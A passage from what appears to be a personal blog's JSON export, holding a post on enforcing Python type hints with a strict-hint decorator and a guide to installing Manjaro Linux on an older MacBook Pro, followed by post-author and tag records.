mixer.music.get_volume()</code></p>\n<p>There’s just one problem — type hints are in no way enforced, at all. Not at runtime, not at compile-time (because there isn’t one), no verification or warning that the received value is actually what you expect. I immediately began running into this problem. Stuff that I expected to be one type would cause problems down the line becaues it was actually something totally incompatible with the expected type.</p>\n<p>To return to our previous example, I initially expected the API I was working with to return the volume as an integer between 1 and 100. Why did I think that? Mainly because I figured any more than that amount of granularity would be silly, but I also knew it could be anything. My first assumption did not turn out to be correct, and my volume-up method didn’t work either.</p>\n<p><code>def volume_up(self):</code><br>\n<code>&quot;&quot;&quot;Request that the audio volume be increased by 5%&quot;&quot;&quot;</code><br>\n<code>log.debug(&quot;Volume requested to be turned up. Current volume %s&quot; % str(self.current_volume))</code><br>\n<code>mixer.music.set_volume(self.current_volume + 5)</code></p>\n<p>The actual return value from self.current_volume was a float between 0 and 1, which did not take to being incremented by 5. If type hints were enforced at all, this would have thrown an error or warning of some kind whenever self.current_volume returned a value that wasn’t an int. Instead, the float was happily passed along, and the volume up function simply silently failed.</p>\n<p>There is a solution to this, I’m not just bitching. And the solution is awesome. The corrected method with enforcement enabled requires a third party library, <em>strict-hint</em>, and an additional import (<em>from strict_hint import strict</em>). The final method looks like this:</p>\n<p><code>@strict</code><br>\n<code>@property</code><br>\n<code>def current_volume(self) -&gt; float:</code><br>\n<code>&quot;&quot;&quot;Retrieve the current volume level.&quot;&quot;&quot;</code><br>\n<code>return mixer.music.get_volume()</code></p>\n<p>That’s it, just add @strict, and if the method tries to return a string, or an integer, it’ll throw an exception and let you know.</p>\n<p>The nicest thing about this isn’t that it enables strict typing. If I wanted pure strict typing, I could write in Kotlin, Java, even C++, and be just as effective. What I’m excited about here is that it’s <em>optional</em>. Sometimes, you don’t want to assert what type you’re going to receive or return, and sometimes, it’s just <em>easier not to</em>. And that’s okay, you can still code as fast as your little fingers will allow, and toss these in later, or not at all, and Python will run your script regardless.</p>\n</div>","amp":"760","plaintext":"I was taught programming in Java, which, relatively to Python, has a lot  of\nboilerplate. So when I began writing in Python more frequently, it felt freeing,\nas though I could more effectively and quickly get my thoughts down and put them\nto use. This is especially true for small, single-purpose scripts, like the ones\nI recently wrote for my i3blocks configuration\n[https://github.com/dscottboggs/laptop-i3-configuration/tree/master/blocks]. The\nproblem is, this same freedom can lead to confusion and bugs when writing larger\nprojects. One such feature that can create confusion is Python’s strong, but “\nduck [https://en.m.wikipedia.org/wiki/Duck_typing]” typed variables.  Consider a\nmethod I recently wrote:\n\n@property\ndef current_volume(self):\n\"\"\"Retrieve the current volume level.\"\"\"\nreturn mixer.music.get_volume()\n\nThis is for retrieving the current volume level from an audio playback API. Now,\nwhen I’m interpreting that, I might use something like this:\n\nprint(\"The current volume is: %s\" % player.current_volume)\n\nHowever, what if the API returns an integer? We don’t know, because it’s not\nspecified explicitly in the code, and the documentation might lack this\ninformation as well.\n\nRecently, Python has tried to help this problem by creating a standardized way\nof documenting this information and embedding it straight into your code. They\ncall it type hints [https://www.python.org/dev/peps/pep-0484/]. As soon as I\nfound out about this feature, I started sprinkling it into my scripts here and\nthere. I didn’t use it all the time, but sometimes it was really obvious what\nthe type would need to be, so I had a convenient way to annotate this. The above\nexample annotated with type hints looks like this:\n\n@property\ndef current_volume(self) -> int:\n\"\"\"Retrieve the current volume level.\"\"\"\nreturn mixer.music.get_volume()\n\nThere’s just one problem — type hints are in no way enforced, at all. Not at\nruntime, not at compile-time (because there isn’t one), no verification or\nwarning that the received value is actually what you expect. I immediately began\nrunning into this problem. Stuff that I expected to be one type would cause\nproblems down the line becaues it was actually something totally incompatible\nwith the expected type.\n\nTo return to our previous example, I initially expected the API I was working\nwith to return the volume as an integer between 1 and 100. Why did I think that?\nMainly because I figured any more than that amount of granularity would be\nsilly, but I also knew it could be anything. My first assumption did not turn\nout to be correct, and my volume-up method didn’t work either.\n\ndef volume_up(self):\n\"\"\"Request that the audio volume be increased by 5%\"\"\"\nlog.debug(\"Volume requested to be turned up. Current volume %s\" %\nstr(self.current_volume))\nmixer.music.set_volume(self.current_volume + 5)\n\nThe actual return value from self.current_volume was a float between 0 and 1,\nwhich did not take to being incremented by 5. If type hints were enforced at\nall, this would have thrown an error or warning of some kind whenever\nself.current_volume returned a value that wasn’t an int. Instead, the float was\nhappily passed along, and the volume up function simply silently failed.\n\nThere is a solution to this, I’m not just bitching. And the solution is awesome.\nThe corrected method with enforcement enabled requires a third party library, \nstrict-hint, and an additional import (from strict_hint import strict). The\nfinal method looks like this:\n\n@strict\n@property\ndef current_volume(self) -> float:\n\"\"\"Retrieve the current volume level.\"\"\"\nreturn mixer.music.get_volume()\n\nThat’s it, just add @strict, and if the method tries to return a string, or an\ninteger, it’ll throw an exception and let you know.\n\nThe nicest thing about this isn’t that it enables strict typing. If I wanted\npure strict typing, I could write in Kotlin, Java, even C++, and be just as\neffective. What I’m excited about here is that it’s optional. Sometimes, you\ndon’t want to assert what type you’re going to receive or return, and sometimes,\nit’s just easier not to. And that’s okay, you can still code as fast as your\nlittle fingers will allow, and toss these in later, or not at all, and Python\nwill run your script regardless.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2018-04-23T00:16:59.000Z","created_by":"1","updated_at":"2018-04-23T00:16:59.000Z","updated_by":"1","published_at":"2018-04-23T00:16:59.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea05676233300013327a7","uuid":"3ea00ef7-ddeb-486a-bcde-24b35a37ce9c","title":"Manjaro Linux on a Macbook Pro (an older one)","slug":"manjaro-linux-on-a-macbook-pro","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nMacOS is decent. It’s works, the animations look pretty, and this Macbook Pro from 6 years ago is still a beast of a machine. But animations and things working out of the box don’t make the whole environment, and I’m used to working on Linux. I realize for most people this sounds absurd, but for me, the most software that’s available for what I want to do and how I want to do it aren’t on Windows, and they’re hard to install for Mac. I share this machine, and I don’t know if you’ve ever tried, but brew is impossible to use in a multi-user environment. Which leaves me just hoping for a .dmg or compiling from source, when I could just pop open the Linux app store in whatever desktop I’m using and install whatever I need with a click and my password.\\n\\nBut this post isn’t about the merits of one desktop or terminal environment over another. I merely wanted to document the process of getting it working. Currently, the most comprehensive guide is [here](https://medium.com/@philpl/arch-linux-running-on-my-macbook-2ea525ebefe3), but that’s a guide for installing Arch Linux from scratch, which I just can’t be bothered to do. I mean, I could do it, but that process would take a good few hours of careful, attentive work, while this one can be done in probably an hour while you’re watching some TV or something.\\n\\nUnfortunately, the guide is not yet complete, as I’m still trying to get wireless to work. I can list networks and attempt to connect, but something goes wrong. I use this setup with an ethernet cable most of the time, but this issue certainly prevents this setup from being a complete solution. Any suggestions would be appreciated.\\n\\nManjaro is pretty awesome, especially the “[architect](https://osdn.net/projects/manjaro/storage/architect/)” install disk. I don’t run it on my servers, but both the Macbook and my slower, older laptop are running Manjaro. The Architect installer allows you to choose from any currently supported Linux kernel, and more than a dozen different desktops, or even no desktop at all. It even prompts you to install any extra packages alongside the desktop,, and to `chroot` into the environment before booting it, allowing for a full custom configuration a-la Arch, but without the hassle of manually performing every step.\\n\\nI would also like to note that my boyfriend would kill me if I deleted macOS off of his hard drive, so I’ve swapped his DVD drive out for a second solid-state drive. Therefore, while this is technically a dual-boot setup, it doesn’t involve any of the difficulties usually encountered when trying to run macOS alongside other operating systems. No need for rEFInd.\\n\\nThe first step is to burn the disk image to a USB drive. I believe macOS comes with a utility called “disk utility” for doing this sort of thing, but coming from Linux I’m more familiar with `dd(1)`. First, `lsblk(1)` to find out how your disks are laid out. You could **irreparably break your installation of macOS** if you choose the wrong disk from the `lsblk(1)` output, so be sure it’s your flash drive that you are pointing this `dd(1)` command at. Also, this will obviously **destroy any data** on the flash drive, including its filesystem. It will need reformatted to be used again after this.\\n\\n`dd bs=4m if=/path/to/manjaro-architect.img of=/dev/diskX`\\n\\nSince `dd(1)` doesn’t show any sort of a progress bar (on mac, anyway), you should distract yourself for the next 5 or 10 minutes while it copies the files*. Once it’s done, tell your macbook to turn itself off, then hold the option key and turn it back on. Keep holding the option key until the list of available boot drives comes up, and choose “EFI boot” rather than macOS.\\n\\nWalk yourself through the manjaro architect installer, bearing these important notes in mind:\\n\\n- When prompted to choose a kernel, choose version 4.14. Linux Kernel 4.16+ don’t seem to have the drivers necessary for booting to the macbook yet, as of the time of writing. If it’s been even a few months since this posting, and you have the time to probably go through the installation twice, please give the latest LTS kernel version a try and comment below if it’s working.\\n- When you get to the “install bootloader” step, choose “systemd boot”. This is the bootloader that the installer uses, so if the installer boots, so will it.\\n- MacOS handles the thermal controls for  your Macbook, not the firmware. As such, you need to install the package macfanctld (mac fan control daemon) in order to keep your macbook from idling hot enough to brew your morning coffee. This step can be accomplished after installation but before booting into the final environment by entering the chroot environment when prompted after the install, by following these steps: - Install the macfanctld package\\n- Add `coretemp` and `applesmc` on separate lines to the file `/etc/modules-load.d/modules.conf`\\n- Recommended: increase the minimum fan speed in /etc/macfanctld.conf to at least 3500 RPM.\\n- Enable the macfanctld service.\\n\\nThe thermal configuration can be accomplished with the following commands/script:\\n\\n` # pacman -Syu macfanctld`  \\n` # echo applesmc >> /etc/modules-load.d/modules.conf`  \\n` # echo coretemp >> /etc/modules-load.d/modules.conf`  \\n` # sed -i.original 's/fan_min: .*/fan_min: 3500/' /etc/macfanctld.conf`  \\n` # systemctl enable macfanctld`\\n\\nWith those 3 steps in addition to the typical Manjaro installation, you should have a full linux desktop on a mid-2012 Macbook Pro (the 9,2 model).\\n\\n \\n\\nPS regarding the progress of a dd command: if you are genuinely concerned that dd is hung, you can run the following command from another terminal, and dd will output how much it has copied so far. I have never seen dd hang though so that shouldn’t be a problem.\\n\\n`sudo kill -s INFO $(ps aux | grep manjaro | grep -v grep | awk '{print $2}')`\\n\\nAgain, it really shouldn’t be neccessary, just be patient. Once you’re done, you can just do it in Linux, where there *is *a progress bar.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>MacOS is decent. It’s works, the animations look pretty, and this Macbook Pro from 6 years ago is still a beast of a machine. But animations and things working out of the box don’t make the whole environment, and I’m used to working on Linux. I realize for most people this sounds absurd, but for me, the most software that’s available for what I want to do and how I want to do it aren’t on Windows, and they’re hard to install for Mac. I share this machine, and I don’t know if you’ve ever tried, but brew is impossible to use in a multi-user environment. Which leaves me just hoping for a .dmg or compiling from source, when I could just pop open the Linux app store in whatever desktop I’m using and install whatever I need with a click and my password.</p>\n<p>But this post isn’t about the merits of one desktop or terminal environment over another. I merely wanted to document the process of getting it working. Currently, the most comprehensive guide is <a href=\"https://medium.com/@philpl/arch-linux-running-on-my-macbook-2ea525ebefe3\">here</a>, but that’s a guide for installing Arch Linux from scratch, which I just can’t be bothered to do. I mean, I could do it, but that process would take a good few hours of careful, attentive work, while this one can be done in probably an hour while you’re watching some TV or something.</p>\n<p>Unfortunately, the guide is not yet complete, as I’m still trying to get wireless to work. I can list networks and attempt to connect, but something goes wrong. I use this setup with an ethernet cable most of the time, but this issue certainly prevents this setup from being a complete solution. Any suggestions would be appreciated.</p>\n<p>Manjaro is pretty awesome, especially the “<a href=\"https://osdn.net/projects/manjaro/storage/architect/\">architect</a>” install disk. I don’t run it on my servers, but both the Macbook and my slower, older laptop are running Manjaro. The Architect installer allows you to choose from any currently supported Linux kernel, and more than a dozen different desktops, or even no desktop at all. It even prompts you to install any extra packages alongside the desktop,, and to <code>chroot</code> into the environment before booting it, allowing for a full custom configuration a-la Arch, but without the hassle of manually performing every step.</p>\n<p>I would also like to note that my boyfriend would kill me if I deleted macOS off of his hard drive, so I’ve swapped his DVD drive out for a second solid-state drive. Therefore, while this is technically a dual-boot setup, it doesn’t involve any of the difficulties usually encountered when trying to run macOS alongside other operating systems. No need for rEFInd.</p>\n<p>The first step is to burn the disk image to a USB drive. I believe macOS comes with a utility called “disk utility” for doing this sort of thing, but coming from Linux I’m more familiar with <code>dd(1)</code>. First, <code>lsblk(1)</code> to find out how your disks are laid out. You could <strong>irreparably break your installation of macOS</strong> if you choose the wrong disk from the <code>lsblk(1)</code> output, so be sure it’s your flash drive that you are pointing this <code>dd(1)</code> command at. Also, this will obviously <strong>destroy any data</strong> on the flash drive, including its filesystem. It will need reformatted to be used again after this.</p>\n<p><code>dd bs=4m if=/path/to/manjaro-architect.img of=/dev/diskX</code></p>\n<p>Since <code>dd(1)</code> doesn’t show any sort of a progress bar (on mac, anyway), you should distract yourself for the next 5 or 10 minutes while it copies the files*. Once it’s done, tell your macbook to turn itself off, then hold the option key and turn it back on. Keep holding the option key until the list of available boot drives comes up, and choose “EFI boot” rather than macOS.</p>\n<p>Walk yourself through the manjaro architect installer, bearing these important notes in mind:</p>\n<ul>\n<li>When prompted to choose a kernel, choose version 4.14. Linux Kernel 4.16+ don’t seem to have the drivers necessary for booting to the macbook yet, as of the time of writing. If it’s been even a few months since this posting, and you have the time to probably go through the installation twice, please give the latest LTS kernel version a try and comment below if it’s working.</li>\n<li>When you get to the “install bootloader” step, choose “systemd boot”. This is the bootloader that the installer uses, so if the installer boots, so will it.</li>\n<li>MacOS handles the thermal controls for  your Macbook, not the firmware. As such, you need to install the package macfanctld (mac fan control daemon) in order to keep your macbook from idling hot enough to brew your morning coffee. This step can be accomplished after installation but before booting into the final environment by entering the chroot environment when prompted after the install, by following these steps: - Install the macfanctld package</li>\n<li>Add <code>coretemp</code> and <code>applesmc</code> on separate lines to the file <code>/etc/modules-load.d/modules.conf</code></li>\n<li>Recommended: increase the minimum fan speed in /etc/macfanctld.conf to at least 3500 RPM.</li>\n<li>Enable the macfanctld service.</li>\n</ul>\n<p>The thermal configuration can be accomplished with the following commands/script:</p>\n<p><code># pacman -Syu macfanctld</code><br>\n<code># echo applesmc &gt;&gt; /etc/modules-load.d/modules.conf</code><br>\n<code># echo coretemp &gt;&gt; /etc/modules-load.d/modules.conf</code><br>\n<code># sed -i.original 's/fan_min: .*/fan_min: 3500/' /etc/macfanctld.conf</code><br>\n<code># systemctl enable macfanctld</code></p>\n<p>With those 3 steps in addition to the typical Manjaro installation, you should have a full linux desktop on a mid-2012 Macbook Pro (the 9,2 model).</p>\n<p></p>\n<p>PS regarding the progress of a dd command: if you are genuinely concerned that dd is hung, you can run the following command from another terminal, and dd will output how much it has copied so far. I have never seen dd hang though so that shouldn’t be a problem.</p>\n<p><code>sudo kill -s INFO $(ps aux | grep manjaro | grep -v grep | awk '{print $2}')</code></p>\n<p>Again, it really shouldn’t be neccessary, just be patient. Once you’re done, you can just do it in Linux, where there *is *a progress bar.</p>\n</div>","amp":"764","plaintext":"MacOS is decent. It’s works, the animations look pretty, and this Macbook Pro\nfrom 6 years ago is still a beast of a machine. But animations and things\nworking out of the box don’t make the whole environment, and I’m used to working\non Linux. I realize for most people this sounds absurd, but for me, the most\nsoftware that’s available for what I want to do and how I want to do it aren’t\non Windows, and they’re hard to install for Mac. I share this machine, and I\ndon’t know if you’ve ever tried, but brew is impossible to use in a multi-user\nenvironment. Which leaves me just hoping for a .dmg or compiling from source,\nwhen I could just pop open the Linux app store in whatever desktop I’m using and\ninstall whatever I need with a click and my password.\n\nBut this post isn’t about the merits of one desktop or terminal environment over\nanother. I merely wanted to document the process of getting it working.\nCurrently, the most comprehensive guide is here\n[https://medium.com/@philpl/arch-linux-running-on-my-macbook-2ea525ebefe3], but\nthat’s a guide for installing Arch Linux from scratch, which I just can’t be\nbothered to do. I mean, I could do it, but that process would take a good few\nhours of careful, attentive work, while this one can be done in probably an hour\nwhile you’re watching some TV or something.\n\nUnfortunately, the guide is not yet complete, as I’m still trying to get\nwireless to work. I can list networks and attempt to connect, but something goes\nwrong. I use this setup with an ethernet cable most of the time, but this issue\ncertainly prevents this setup from being a complete solution. Any suggestions\nwould be appreciated.\n\nManjaro is pretty awesome, especially the “architect\n[https://osdn.net/projects/manjaro/storage/architect/]” install disk. I don’t\nrun it on my servers, but both the Macbook and my slower, older laptop are\nrunning Manjaro. The Architect installer allows you to choose from any currently\nsupported Linux kernel, and more than a dozen different desktops, or even no\ndesktop at all. It even prompts you to install any extra packages alongside the\ndesktop,, and to chroot  into the environment before booting it, allowing for a\nfull custom configuration a-la Arch, but without the hassle of manually\nperforming every step.\n\nI would also like to note that my boyfriend would kill me if I deleted macOS off\nof his hard drive, so I’ve swapped his DVD drive out for a second solid-state\ndrive. Therefore, while this is technically a dual-boot setup, it doesn’t\ninvolve any of the difficulties usually encountered when trying to run macOS\nalongside other operating systems. No need for rEFInd.\n\nThe first step is to burn the disk image to a USB drive. I believe macOS comes\nwith a utility called “disk utility” for doing this sort of thing, but coming\nfrom Linux I’m more familiar with dd(1). First, lsblk(1)  to find out how your\ndisks are laid out. You could irreparably break your installation of macOS  if\nyou choose the wrong disk from the lsblk(1)  output, so be sure it’s your flash\ndrive that you are pointing this dd(1)  command at. Also, this will obviously \ndestroy any data  on the flash drive, including its filesystem. It will need\nreformatted to be used again after this.\n\ndd bs=4m if=/path/to/manjaro-architect.img of=/dev/diskX\n\nSince dd(1)  doesn’t show any sort of a progress bar (on mac, anyway), you\nshould distract yourself for the next 5 or 10 minutes while it copies the\nfiles*. Once it’s done, tell your macbook to turn itself off, then hold the\noption key and turn it back on. Keep holding the option key until the list of\navailable boot drives comes up, and choose “EFI boot” rather than macOS.\n\nWalk yourself through the manjaro architect installer, bearing these important\nnotes in mind:\n\n * When prompted to choose a kernel, choose version 4.14. Linux Kernel 4.16+\n   don’t seem to have the drivers necessary for booting to the macbook yet, as\n   of the time of writing. If it’s been even a few months since this posting,\n   and you have the time to probably go through the installation twice, please\n   give the latest LTS kernel version a try and comment below if it’s working.\n * When you get to the “install bootloader” step, choose “systemd boot”. This is\n   the bootloader that the installer uses, so if the installer boots, so will\n   it.\n * MacOS handles the thermal controls for  your Macbook, not the firmware. As\n   such, you need to install the package macfanctld (mac fan control daemon) in\n   order to keep your macbook from idling hot enough to brew your morning\n   coffee. This step can be accomplished after installation but before booting\n   into the final environment by entering the chroot environment when prompted\n   after the install, by following these steps: - Install the macfanctld package\n * Add coretemp  and applesmc  on separate lines to the file \n   /etc/modules-load.d/modules.conf\n * Recommended: increase the minimum fan speed in /etc/macfanctld.conf to at\n   least 3500 RPM.\n * Enable the macfanctld service.\n\nThe thermal configuration can be accomplished with the following\ncommands/script:\n\n# pacman -Syu macfanctld\n# echo applesmc >> /etc/modules-load.d/modules.conf\n# echo coretemp >> /etc/modules-load.d/modules.conf\n# sed -i.original 's/fan_min: .*/fan_min: 3500/' /etc/macfanctld.conf\n# systemctl enable macfanctld\n\nWith those 3 steps in addition to the typical Manjaro installation, you should\nhave a full linux desktop on a mid-2012 Macbook Pro (the 9,2 model).\n\n\n\nPS regarding the progress of a dd command: if you are genuinely concerned that\ndd is hung, you can run the following command from another terminal, and dd will\noutput how much it has copied so far. I have never seen dd hang though so that\nshouldn’t be a problem.\n\nsudo kill -s INFO $(ps aux | grep manjaro | grep -v grep | awk '{print $2}')\n\nAgain, it really shouldn’t be neccessary, just be patient. Once you’re done, you\ncan just do it in Linux, where there *is *a progress bar.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2018-07-23T00:34:55.000Z","created_by":"1","updated_at":"2018-07-23T00:36:36.000Z","updated_by":"1","published_at":"2018-07-23T00:34:55.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null}],"posts_authors":[{"id":"5b8ea05676233300013327af","post_id":"5b8ea0567623330001332764","author_id":"1","sort_order":0},{"id":"5b8ea05776233300013327bd","post_id":"5b8ea0567623330001332765","author_id":"1","sort_order":0},{"id":"5b8ea05776233300013327be","post_id":"5b8ea0567623330001332766","author_id":"1","sort_order":0},{"id":"5b8ea05776233300013327d3","post_id":"5b8ea0567623330001332767","author_id":"1","sort_order":0},{"id":"5b8ea05776233300013327da","post_id":"5b8ea0567623330001332768","author_id":"1","sort_order":0},{"id":"5b8ea05776233300013327eb","post_id":"5b8ea0567623330001332769","author_id":"1","sort_order":0},{"id":"5b8ea05776233300013327f3","post_id":"5b8ea056762333000133276a","author_id":"1","sort_order":0},{"id":"5b8ea05776233300013327ff","post_id":"5b8ea056762333000133276b","author_id":"1","sort_order":0},{"id":"5b8ea057762333000133280a","post_id":"5b8ea056762333000133276c","author_id":"1","sort_order":0},{"id":"5b8ea057762333000133280b","post_id":"5b8ea056762333000133276d","author_id":"1","sort_order":0},{"id":"5b8ea0577623330001332813","post_id":"5b8ea056762333000133276e","author_id":"1","sort_order":0},{"id":"5b8ea057762333000133281c","post_id":"5b8ea056762333000133276f","author_id":"1","sort_order":0},{"id":"5b8ea0577623330001332827","post_id":"5b8ea0567623330001332770","author_id":"1","sort_order":0},{"id":"5b8ea0577623330001332832","post_id":"5b8ea0567623330001332771","author_id":"1","sort_order":0},{"id":"5b8ea0577623330001332833","post_id":"5b8ea0567623330001332772","author_id":"1","sort_order":0},{"id":"5b8ea0577623330001332834","post_id":"5b8ea0567623330001332773","author_id":"1","sort_order":0},{"id":"5b8ea0577623330001332835","post_id":"5b8ea0567623330001332774","author_id":"1","sort_order":0},{"id":"5b8ea0587623330001332836","post_id":"5b8ea0567623330001332775","author_id":"1","sort_order":0},{"id":"5b8ea0587623330001332837","post_id":"5b8ea0567623330001332776","author_id":"1","sort_order":0},{"id":"5b8ea0587623330001332838","post_id":"5b8ea0567623330001332777","author_id":"1","sort_order":0},{"id":"5b8ea058762333000133283d","post_id":"5b8ea0567623330001332778","author_id":"1","sort_order":0},{"id":"5b8ea0587623330001332846","post_id":"5b8ea0567623330001332779","author_id":"1","sort_order":0},{"id":"5b8ea0587623330001332847","post_id":"5b8ea056762333000133277a","author_id":"5b8ea0547623330001332617","sort_order":0},{"id":"5b8ea0587623330001332848","post_id":"5b8ea056762333000133277b","author_id":"1","sort_order":0},{"id":"5b8ea0587623330001332849","post_id":"5b8ea056762333000133277c","author_id":"1","sort_order":0},{"id":"5b8ea0587623330001332850","post_id":"5b8ea056762333000133277d","author_id":"1","sort_order":0},{"id":"5b8ea0587623330001332851","post_id":"5b8ea056762333000133277e","author_id":"1","sort_order":0},{"id":"5b8ea058762333000133285d","post_id":"5b8ea056762333000133277f","author_id":"1","sort_order":0},{"id":"5b8ea058762333000133285e","post_id":"5b8ea0567623330001332780","author_id":"1","sort_order":0},{"id":"5b8ea058762333000133285f","post_id":"5b8ea0567623330001332781","author_id":"1","sort_order":0},{"id":"5b8ea0587623330001332860","post_id":"5b8ea0567623330001332782","author_id":"1","sort_order":0},{"id":"5b8ea0587623330001332866","post_id":"5b8ea0567623330001332783","author_id":"1","sort_order":0},{"id":"5b8ea0597623330001332867","post_id":"5b8ea0567623330001332784","author_id":"1","sort_order":0},{"id":"5b8ea0597623330001332868","post_id":"5b8ea0567623330001332785","author_id":"1","sort_order":0},{"id":"5b8ea0597623330001332875","post_id":"5b8ea0567623330001332786","author_id":"1","sort_order":0},{"id":"5b8ea0597623330001332876","post_id":"5b8ea0567623330001332787","author_id":"1","sort_order":0},{"id":"5b8ea05a762333000133288c","post_id":"5b8ea0567623330001332788","author_id":"1","sort_order":0},{"id":"5b8ea05a7623330001332895","post_id":"5b8ea0567623330001332789","author_id":"1","sort_order":0},{"id":"5b8ea05a76233300013328a1","post_id":"5b8ea056762333000133278a","author_id":"1","sort_order":0},{"id":"5b8ea05a76233300013328a2","post_id":"5b8ea056762333000133278b","author_id":"1","sort_order":0},{"id":"5b8ea05a76233300013328a3","post_id":"5b8ea056762333000133278c","author_id":"1","sort_order":0},{"id":"5b8ea05a76233300013328a4","post_id":"5b8ea056762333000133278d","author_id":"1","sort_order":0},{"id":"5b8ea05a76233300013328a5","post_id":"5b8ea056762333000133278e","author_id":"1","sort_order":0},{"id":"5b8ea05a76233300013328a6","post_id":"5b8ea056762333000133278f","author_id":"1","sort_order":0},{"id":"5b8ea05a76233300013328c9","post_id":"5b8ea0567623330001332790","author_id":"1","sort_order":0},{"id":"5b8ea05a76233300013328db","post_id":"5b8ea0567623330001332791","author_id":"1","sort_order":0},{"id":"5b8ea05a76233300013328dc","post_id":"5b8ea0567623330001332792","author_id":"1","sort_order":0},{"id":"5b8ea05a76233300013328e0","post_id":"5b8ea0567623330001332793","author_id":"1","sort_order":0},{"id":"5b8ea05a76233300013328e1","post_id":"5b8ea0567623330001332794","author_id":"1","sort_order":0},{"id":"5b8ea05a76233300013328e8","post_id":"5b8ea0567623330001332795","author_id":"1","sort_order":0},{"id":"5b8ea05a76233300013328e9","post_id":"5b8ea0567623330001332796","author_id":"1","sort_order":0},{"id":"5b8ea05a76233300013328f7","post_id":"5b8ea0567623330001332797","author_id":"1","sort_order":0},{"id":"5b8ea05a76233300013328f8","post_id":"5b8ea0567623330001332798","author_id":"1","sort_order":0},{"id":"5b8ea05a762333000133290b","post_id":"5b8ea0567623330001332799","author_id":"1","sort_order":0},{"id":"5b8ea05b7623330001332916","post_id":"5b8ea056762333000133279a","author_id":"1","sort_order":0},{"id":"5b8ea05b7623330001332919","post_id":"5b8ea056762333000133279b","author_id":"1","sort_order":0},{"id":"5b8ea05b762333000133291a","post_id":"5b8ea056762333000133279c","author_id":"1","sort_order":0},{"id":"5b8ea05b7623330001332920","post_id":"5b8ea056762333000133279d","author_id":"1","sort_order":0},{"id":"5b8ea05b7623330001332932","post_id":"5b8ea056762333000133279e","author_id":"1","sort_order":0},{"id":"5b8ea05b7623330001332946","post_id":"5b8ea056762333000133279f","author_id":"1","sort_order":0},{"id":"5b8ea05b7623330001332957","post_id":"5b8ea05676233300013327a0","author_id":"1","sort_order":0},{"id":"5b8ea05b7623330001332968","post_id":"5b8ea05676233300013327a1","author_id":"1","sort_order":0},{"id":"5b8ea05b7623330001332969","post_id":"5b8ea05676233300013327a2","author_id":"1","sort_order":0},{"id":"5b8ea05b7623330001332975","post_id":"5b8ea05676233300013327a3","author_id":"1","sort_order":0},{"id":"5b8ea05b7623330001332983","post_id":"5b8ea05676233300013327a4","author_id":"1","sort_order":0},{"id":"5b8ea05b7623330001332984","post_id":"5b8ea05676233300013327a5","author_id":"1","sort_order":0},{"id":"5b8ea05b762333000133298c","post_id":"5b8ea05676233300013327a6","author_id":"1","sort_order":0},{"id":"5b8ea05b76233300013329a3","post_id":"5b8ea05676233300013327a7","author_id":"1","sort_order":0}],"posts_tags":[{"id":"5b8ea05676233300013327a8","post_id":"5b8ea0567623330001332764","tag_id":"5b8ea055762333000133267e","sort_order":0},{"id":"5b8ea05676233300013327a9","post_id":"5b8ea0567623330001332764","tag_id":"5b8ea055762333000133268a","sort_order":1},{"id":"5b8ea05676233300013327aa","post_id":"5b8ea0567623330001332764","tag_id":"5b8ea05576233300013326b9","sort_order":2},{"id":"5b8ea05676233300013327ab","post_id":"5b8ea0567623330001332764","tag_id":"5b8ea05576233300013326db","sort_order":3},{"id":"5b8ea05676233300013327ac","post_id":"5b8ea0567623330001332764","tag_id":"5b8ea05576233300013326f0","sort_order":4},{"id":"5b8ea05676233300013327ad","post_id":"5b8ea0567623330001332764","tag_id":"5b8ea055762333000133272d","sort_order":5},{"id":"5b8ea05676233300013327ae","post_id":"5b8ea0567623330001332764","tag_id":"5b8ea055762333000133274f","sort_order":6},{"id":"5b8ea05776233300013327b0","post_id":"5b8ea0567623330001332765","tag_id":"5b8ea0557623330001332635","sort_order":0},{"id":"5b8ea05776233300013327b1","post_id":"5b8ea0567623330001332765","tag_id":"5b8ea055762333000133263c","sort_order":1},{"id":"5b8ea05776233300013327b2","post_id":"5b8ea0567623330001332765","tag_id":"5b8ea0557623330001332671","sort_order":2},{"id":"5b8ea05776233300013327b3","post_id":"5b8ea0567623330001332765","tag_id":"5b8ea0557623330001332687","sort_order":3},{"id":"5b8ea05776233300013327b4","post_id":"5b8ea0567623330001332765","tag_id":"5b8ea055762333000133268a","sort_order":4},{"id":"5b8ea05776233300013327b5","post_id":"5b8ea0567623330001332765","tag_id":"5b8ea05576233300013326b9","sort_order":5},{"id":"5b8ea05776233300013327b6","post_id":"5b8ea0567623330001332765","tag_id":"5b8ea05576233300013326db","sort_order":6},{"id":"5b8ea05776233300013327b7","post_id":"5b8ea0567623330001332765","tag_id":"5b8ea05576233300013326e0","sort_order":7},{"id":"5b8ea05776233300013327b8","post_id":"5b8ea0567623330001332765","tag_id":"5b8ea05576233300013326f0","sort_order":8},{"id":"5b8ea05776233300013327b9","post_id":"5b8ea0567623330001332765","tag_id":"5b8ea05576233300013326f7","sort_order":9},{"id":"5b8ea05776233300013327ba","post_id":"5b8ea0567623330001332765","tag_id":"5b8ea0557623330001332714","sort_order":10},{"id":"5b8ea05776233300013327bb","post_id":"5b8ea0567623330001332765","tag_id":"5b8ea0557623330001332717","sort_order":11},{"id":"5b8ea05776233300013327bc","post_id":"5b8ea0567623330001332765","tag_id":"5b8ea0557623330001332731","sort_order":12},{"id":"5b8ea05776233300013327bf","post_id":"5b8ea0567623330001332767","tag_id":"5b8ea0557623330001332637","sort_order":0},{"id":"5b8ea05776233300013327c0","post_id":"5b8ea0567623330001332767","tag_id":"5b8ea0557623330001332650","sort_order":1},{"id":"5b8ea05776233300013327c1","post_id":"5b8ea0567623330001332767","tag_id":"5b8ea055762333000133265a","sort_order":2},{"id":"5b8ea05776233300013327c2","post_id":"5b8ea0567623330001332767","tag_id":"5b8ea055762333000133265f",